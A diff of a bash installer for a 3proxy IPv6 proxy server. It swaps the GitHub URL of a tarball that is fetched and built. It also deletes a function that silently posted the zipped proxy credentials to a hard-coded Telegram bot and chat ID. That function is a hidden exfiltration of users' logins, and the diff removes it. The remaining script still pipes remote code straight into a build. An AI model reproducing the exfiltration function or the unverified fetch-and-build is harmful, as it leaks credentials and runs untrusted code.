@@ -13,7 +13,7 @@ gen64() {
 }
 install_3proxy() {
     echo "installing 3proxy"
-    URL="https://raw.githubusercontent.com/tungtruong20xx/multi_proxy_ipv6/main/3proxy-3proxy-0.8.6.tar.gz"
+    URL="https://raw.githubusercontent.com/ngochoaitn/multi_proxy_ipv6/main/3proxy-3proxy-0.8.6.tar.gz"
     wget -qO- $URL | bsdtar -xvf-
     cd 3proxy-3proxy-0.8.6
     make -f Makefile.Linux
@@ -55,24 +55,12 @@ upload_proxy() {
     local PASS=$(random)
     zip --password $PASS proxy.zip proxy.txt
     URL=$(curl -s --upload-file proxy.zip https://transfer.sh/proxy.zip)
-	
+
     echo "Proxy is ready! Format IP:PORT:LOGIN:PASS"
     echo "Download zip archive from: ${URL}"
     echo "Password: ${PASS}"
 
 }
-
-upload_proxy_tele() {
-    local PASS=$(random)
-    zip --password $PASS proxy.zip proxy.txt
-    URL=$(curl -F document=@"proxy.zip" https://api.telegram.org/bot"AAEYAL8PFDgQl9EjAtk4xzAjcxxjs3U0Kbw"/sendDocument?chat_id="6217485809")
-	
-    echo "Proxy is ready! Format IP:PORT:LOGIN:PASS"
-    echo "Download zip archive from: ${URL}"
-    echo "Password: ${PASS}"
-
-}
-
 gen_data() {
     seq $FIRST_PORT $LAST_PORT | while read port; do
         echo "$IP4/$port/$(gen64 $IP6)"
@@ -130,5 +118,3 @@ bash /etc/rc.local
 gen_proxy_file_for_user
 
 upload_proxy
-
-upload_proxy_tele
